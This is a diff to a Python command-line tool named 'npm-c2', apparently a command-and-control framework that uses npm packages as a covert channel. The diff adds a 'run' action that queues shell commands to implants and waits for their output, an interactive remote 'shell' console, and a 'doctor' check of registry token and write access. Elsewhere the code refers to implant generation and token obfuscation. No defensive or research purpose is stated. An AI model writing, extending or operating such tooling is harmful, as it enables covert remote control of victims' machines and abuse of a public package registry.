@@ -55,7 +55,7 @@ def _test():
 
 def main():
     p = argparse.ArgumentParser(prog="npm-c2")
-    p.add_argument("--version", action="version", version="1.1.0")
+    p.add_argument("--version", action="version", version="1.2.0")
     p.add_argument("--self-test", action="store_true")
     p.add_argument("--generate-standalone", action="store_true",
                    help="print standalone implant to stdout")
@@ -76,9 +76,19 @@ def main():
     op.add_argument("--token", "-t", required=True)
     act = op.add_subparsers(dest="action", required=True)
 
-    t = act.add_parser("task")
+    t = act.add_parser("task", help="queue a command and return at once")
     t.add_argument("--cmd")
     t.add_argument("--file")
+
+    r = act.add_parser("run", help="queue a command and wait for its output")
+    r.add_argument("cmd", nargs="?", help="shell command (or use --file)")
+    r.add_argument("--file")
+    r.add_argument("--timeout", type=int, default=120,
+                   help="seconds to wait for output (default 120)")
+    r.add_argument("--interval", type=int, default=3,
+                   help="seconds between polls while waiting (default 3)")
+
+    act.add_parser("shell", help="interactive console: command in, output out")
     act.add_parser("poll")
     act.add_parser("beacons")
     c = act.add_parser("clean")
@@ -86,6 +96,13 @@ def main():
     w = act.add_parser("watch")
     w.add_argument("--interval", type=int, default=5)
     act.add_parser("stats")
+
+    doc = sub.add_parser("doctor",
+                         help="check token, package and write access for real")
+    doc.add_argument("--package", "-p", required=True)
+    doc.add_argument("--token", "-t", default=None)
+    doc.add_argument("--base", default=None,
+                     help="override the registry base URL (default: npmjs)")
 
     imp = sub.add_parser("implant")
     imp.add_argument("--package", "-p", required=True)
@@ -108,6 +125,11 @@ def main():
         print(generate_standalone(token=args.token, package=args.package))
         return
 
+    if args.mode == "doctor":
+        from .doctor import doctor
+        checks = doctor(args.package, args.token, base=args.base)
+        sys.exit(0 if all(c.ok for c in checks) else 2 if any(c.fatal for c in checks) else 1)
+
     if args.mode == "obfuscate":
         from . import obfuscate_token
         print(obfuscate_token(args.token, args.package))
@@ -129,6 +151,23 @@ def main():
                 sys.exit(0 if ok else 1)
             elif args.action == "poll":
                 o.poll_results()
+            elif args.action == "run":
+                if args.file:
+                    with open(args.file, "rb") as f:
+                        cmd = f.read().decode("utf-8", errors="replace")
+                elif args.cmd:
+                    cmd = args.cmd
+                else:
+                    print("[-] use a command argument or --file", file=sys.stderr)
+                    sys.exit(1)
+                out = o.run_command(cmd, timeout=args.timeout,
+                                    interval=args.interval)
+                if out is None:
+                    print("[-] no output before the timeout", file=sys.stderr)
+                    sys.exit(3)
+                print(out)
+            elif args.action == "shell":
+                o.interact(timeout=120)
             elif args.action == "beacons":
                 o.list_beacons()
             elif args.action == "clean":
